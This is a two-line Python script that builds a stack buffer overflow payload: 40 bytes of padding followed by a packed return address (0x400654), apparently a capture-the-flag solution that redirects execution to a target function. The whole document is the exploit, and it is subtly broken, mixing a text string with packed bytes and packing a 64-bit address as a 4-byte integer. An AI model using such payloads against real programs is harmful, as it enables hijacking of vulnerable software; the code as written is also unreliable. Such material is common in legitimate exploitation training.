import struct
print('A'*(32+8) + struct.pack("<i", 0x400654))
